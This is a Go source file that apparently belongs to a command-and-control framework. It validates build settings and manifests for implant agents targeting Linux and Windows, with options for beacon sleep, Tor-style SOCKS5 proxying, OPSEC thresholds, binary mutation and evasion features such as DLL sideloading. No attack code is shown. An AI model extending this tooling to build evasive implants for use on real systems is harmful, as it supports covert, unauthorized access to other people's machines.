package payload

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math"
	"path"
	"strings"
	"time"
)

const payloadBuildManifestSchemaV1 = "microc2.payload-build-manifest.v1"

type payloadProfileKey struct {
	architecture string
	format       string
}

type payloadBuildProfile struct {
	targetOS     string
	targetTriple string
	filename     string
}

var supportedPayloadProfiles = map[payloadProfileKey]payloadBuildProfile{
	{architecture: "x64", format: "linux_elf"}: {
		targetOS:     "linux",
		targetTriple: "x86_64-unknown-linux-gnu",
		filename:     "agent",
	},
	{architecture: "x64", format: "windows_exe"}: {
		targetOS:     "windows",
		targetTriple: "x86_64-pc-windows-gnu",
		filename:     "agent.exe",
	},
}

type payloadBuildPlan struct {
	config      PayloadConfig
	profile     payloadBuildProfile
	buildType   string
	maxSessions int
}

type payloadConfigValidationError struct {
	field  string
	reason string
}

func (err *payloadConfigValidationError) Error() string {
	return fmt.Sprintf("invalid payload configuration: %s %s", err.field, err.reason)
}

func invalidPayloadConfig(field, reason string) error {
	return &payloadConfigValidationError{field: field, reason: reason}
}

func validateAndResolvePayloadConfig(
	config PayloadConfig,
) (payloadBuildPlan, error) {
	if config.ListenerID == "" {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"listener",
			"is required",
		)
	}
	if config.ListenerID != strings.TrimSpace(config.ListenerID) {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"listener",
			"must not contain surrounding whitespace",
		)
	}
	if !validPayloadID(config.ListenerID) {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"listener",
			"must satisfy the identifier contract",
		)
	}

	buildType := ""
	switch config.AgentType {
	case "agent":
		buildType = "release"
	case "debugAgent":
		buildType = "debug"
	default:
		return payloadBuildPlan{}, invalidPayloadConfig(
			"agentType",
			`must be "agent" or "debugAgent"`,
		)
	}

	profile, supported := supportedPayloadProfiles[payloadProfileKey{
		architecture: config.Architecture,
		format:       config.Format,
	}]
	if !supported {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"architecture/format",
			fmt.Sprintf(
				"combination %q/%q is unsupported; supported combinations are x64/linux_elf and x64/windows_exe",
				config.Architecture,
				config.Format,
			),
		)
	}
	if config.Sleep < 1 {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"sleep",
			"must be at least 1 second",
		)
	}
	if config.MutationSeed != "" {
		normalizedSeed, _, err := resolveMutationSeed(config.MutationSeed)
		if err != nil {
			return payloadBuildPlan{}, invalidPayloadConfig(
				"mutation_seed",
				"must be a hexadecimal u64",
			)
		}
		config.MutationSeed = normalizedSeed
	}
	if config.IndirectSyscall {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"indirectSyscall",
			"is not implemented",
		)
	}
	switch config.SleepTechnique {
	case "":
		config.SleepTechnique = "standard"
	case "standard":
	default:
		return payloadBuildPlan{}, invalidPayloadConfig(
			"sleepTechnique",
			`must be "standard"; custom sleep techniques are not implemented`,
		)
	}
	if config.DllSideloading ||
		config.SideloadDll != "" ||
		config.ExportName != "" {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"dllSideloading",
			"is not implemented",
		)
	}
	if config.BaseThresholdExitFullOpsec != 0 ||
		config.BaseThresholdExitReducedActivity != 0 {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"OPSEC exit thresholds",
			"are not implemented",
		)
	}

	if config.Socks5Host == "" {
		config.Socks5Host = "127.0.0.1"
	}
	if config.Socks5Port == 0 {
		config.Socks5Port = 9050
	}
	socks5Host, err := normalizeAdvertisedHost(config.Socks5Host)
	if err != nil {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"socks5_host",
			err.Error(),
		)
	}
	config.Socks5Host = socks5Host
	if config.Socks5Port < 1 || config.Socks5Port > 65535 {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"socks5_port",
			"must be between 1 and 65535",
		)
	}

	for _, setting := range []struct {
		field string
		value int
	}{
		{"proc_scan_interval_secs", config.ProcScanIntervalSecs},
		{"min_duration_full_opsec_secs", config.MinDurationFullOpsecSecs},
		{"min_duration_reduced_activity_secs", config.MinDurationReducedActivitySecs},
		{"min_duration_background_opsec_secs", config.MinDurationBackgroundOpsecSecs},
		{"reduced_activity_sleep_secs", config.ReducedActivitySleepSecs},
		{"base_max_consecutive_c2_failures", config.BaseMaxConsecutiveC2Failures},
		{"c2_threshold_adjust_interval_secs", config.C2ThresholdAdjustIntervalSecs},
	} {
		if setting.value < 0 {
			return payloadBuildPlan{}, invalidPayloadConfig(
				setting.field,
				"must not be negative",
			)
		}
	}
	for _, setting := range []struct {
		field string
		value float64
	}{
		{"base_threshold_enter_full_opsec", config.BaseThresholdEnterFullOpsec},
		{"base_threshold_enter_reduced_activity", config.BaseThresholdEnterReducedActivity},
		{"c2_failure_threshold_increase_factor", config.C2FailureThresholdIncreaseFactor},
		{"c2_failure_threshold_decrease_factor", config.C2FailureThresholdDecreaseFactor},
		{"c2_dynamic_threshold_max_multiplier", config.C2DynamicThresholdMaxMultiplier},
	} {
		if math.IsNaN(setting.value) ||
			math.IsInf(setting.value, 0) ||
			setting.value < 0 {
			return payloadBuildPlan{}, invalidPayloadConfig(
				setting.field,
				"must be a finite non-negative number",
			)
		}
	}
	for _, setting := range []struct {
		field string
		value float64
	}{
		{"base_threshold_enter_full_opsec", config.BaseThresholdEnterFullOpsec},
		{"base_threshold_enter_reduced_activity", config.BaseThresholdEnterReducedActivity},
	} {
		if setting.value > 100 {
			return payloadBuildPlan{}, invalidPayloadConfig(
				setting.field,
				"must not exceed 100",
			)
		}
	}
	if value := config.C2FailureThresholdIncreaseFactor; value != 0 && value < 1 {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"c2_failure_threshold_increase_factor",
			"must be at least 1 when set",
		)
	}
	if value := config.C2FailureThresholdDecreaseFactor; value > 1 {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"c2_failure_threshold_decrease_factor",
			"must not exceed 1",
		)
	}
	if value := config.C2DynamicThresholdMaxMultiplier; value != 0 && value < 1 {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"c2_dynamic_threshold_max_multiplier",
			"must be at least 1 when set",
		)
	}

	maxSessions, err := resolvedPayloadMaxSessions(config.MaxSessions)
	if err != nil {
		return payloadBuildPlan{}, invalidPayloadConfig(
			"max_sessions",
			strings.TrimPrefix(err.Error(), "max_sessions "),
		)
	}
	return payloadBuildPlan{
		config:      config,
		profile:     profile,
		buildType:   buildType,
		maxSessions: maxSessions,
	}, nil
}

func decodePayloadBuildManifest(
	data []byte,
) (PayloadBuildManifest, error) {
	var manifest PayloadBuildManifest
	if err := json.Unmarshal(data, &manifest); err != nil {
		return PayloadBuildManifest{}, fmt.Errorf("decode payload build manifest: %w", err)
	}
	if manifest.SchemaVersion != payloadBuildManifestSchemaV1 {
		return PayloadBuildManifest{}, fmt.Errorf(
			"unsupported payload build manifest schema %q",
			manifest.SchemaVersion,
		)
	}
	if manifest.PayloadID == "" || manifest.ListenerID == "" {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest identity is incomplete",
		)
	}
	if manifest.GitRevision == "" ||
		manifest.SourceState == "" ||
		manifest.TargetOS == "" ||
		manifest.Architecture == "" ||
		manifest.TargetTriple == "" ||
		manifest.Format == "" ||
		manifest.BuildType == "" {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest profile is incomplete",
		)
	}
	if manifest.SourceState != "clean" &&
		manifest.SourceState != "dirty" &&
		manifest.SourceState != "unknown" {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest source state is invalid",
		)
	}
	if manifest.MutationSeed == "" {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest mutation seed is missing",
		)
	}
	normalizedSeed, _, err := resolveMutationSeed(manifest.MutationSeed)
	if err != nil || normalizedSeed != manifest.MutationSeed {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest mutation seed is invalid",
		)
	}
	if len(manifest.MutationFlags) == 0 ||
		manifest.EnrollmentCredentialSource != "server-generated-ephemeral" {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest mutation or enrollment provenance is incomplete",
		)
	}
	canonicalEffectiveConfig, err := canonicalJSONObject(
		manifest.EffectiveConfig,
	)
	if err != nil {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest effective config is invalid: %w",
			err,
		)
	}
	var effectiveConfig map[string]interface{}
	if err := json.Unmarshal(
		canonicalEffectiveConfig,
		&effectiveConfig,
	); err != nil || effectiveConfig == nil {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest effective config is not an object",
		)
	}
	if _, containsCredential := effectiveConfig["enrollment_credential"]; containsCredential {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest effective config contains enrollment credential material",
		)
	}
	if !validSHA256(manifest.ConfigSHA256) ||
		!validSHA256(manifest.Artifact.SHA256) {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest digest is invalid",
		)
	}
	if effectiveConfigHash := fmt.Sprintf(
		"%x",
		sha256.Sum256(canonicalEffectiveConfig),
	); effectiveConfigHash != manifest.ConfigSHA256 {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest effective config digest does not match",
		)
	}
	if manifest.Artifact.Filename == "" ||
		manifest.Artifact.Size < 0 {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest artifact is incomplete",
		)
	}
	if _, err := containedNativeRelativePath(manifest.Artifact.Path); err != nil {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest artifact path is invalid: %w",
			err,
		)
	}
	profile, supported := supportedPayloadProfiles[payloadProfileKey{
		architecture: manifest.Architecture,
		format:       manifest.Format,
	}]
	if !supported ||
		profile.targetOS != manifest.TargetOS ||
		profile.targetTriple != manifest.TargetTriple ||
		profile.filename != manifest.Artifact.Filename ||
		path.Base(manifest.Artifact.Path) != manifest.Artifact.Filename {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest profile is unsupported or inconsistent",
		)
	}
	if manifest.BuildType != "debug" && manifest.BuildType != "release" {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest build type is invalid",
		)
	}
	if _, err := time.Parse(time.RFC3339Nano, manifest.CreatedAt); err != nil {
		return PayloadBuildManifest{}, fmt.Errorf(
			"payload build manifest creation time is invalid",
		)
	}
	return manifest, nil
}

func readEffectiveBuildConfig(
	buildRoot string,
	relativePath string,
	payloadID string,
	listenerID string,
	mutationSeed string,
	enrollmentCredential string,
) (json.RawMessage, error) {
	file, err := openPayloadArtifactBeneath(buildRoot, relativePath)
	if err != nil {
		return nil, fmt.Errorf("open effective build config: %w", err)
	}
	defer file.Close()

	info, err := file.Stat()
	if err != nil {
		return nil, fmt.Errorf("inspect effective build config: %w", err)
	}
	if !info.Mode().IsRegular() ||
		info.Size() < 1 ||
		info.Size() > maxPayloadRequestBytes {
		return nil, errors.New(
			"effective build config must be a bounded regular file",
		)
	}
	data, err := io.ReadAll(io.LimitReader(
		file,
		maxPayloadRequestBytes+1,
	))
	if err != nil {
		return nil, fmt.Errorf("read effective build config: %w", err)
	}
	if len(data) > maxPayloadRequestBytes {
		return nil, errors.New("effective build config is too large")
	}
	if enrollmentCredential != "" &&
		bytes.Contains(data, []byte(enrollmentCredential)) {
		return nil, errors.New(
			"effective build config contains enrollment credential material",
		)
	}
	canonical, err := canonicalJSONObject(data)
	if err != nil {
		return nil, fmt.Errorf("validate effective build config: %w", err)
	}
	var config map[string]interface{}
	if err := json.Unmarshal(canonical, &config); err != nil {
		return nil, fmt.Errorf("decode effective build config: %w", err)
	}
	if _, containsCredential := config["enrollment_credential"]; containsCredential {
		return nil, errors.New(
			"effective build config contains enrollment credential material",
		)
	}
	if config["payload_id"] != payloadID ||
		config["listener_id"] != listenerID ||
		config["mutation_seed"] != mutationSeed {
		return nil, errors.New(
			"effective build config identity does not match the build",
		)
	}
	protocol, ok := config["protocol"].(string)
	if !ok || (protocol != "http" && protocol != "https") {
		return nil, errors.New(
			"effective build config protocol is invalid",
		)
	}
	return canonical, nil
}

func canonicalJSONObject(data []byte) (json.RawMessage, error) {
	var object map[string]interface{}
	if err := json.Unmarshal(data, &object); err != nil {
		return nil, err
	}
	if object == nil {
		return nil, errors.New("JSON value is not an object")
	}
	var compact bytes.Buffer
	if err := json.Compact(&compact, data); err != nil {
		return nil, err
	}
	return append(json.RawMessage(nil), compact.Bytes()...), nil
}

func validSHA256(value string) bool {
	if len(value) != 64 {
		return false
	}
	_, err := hex.DecodeString(value)
	return err == nil
}
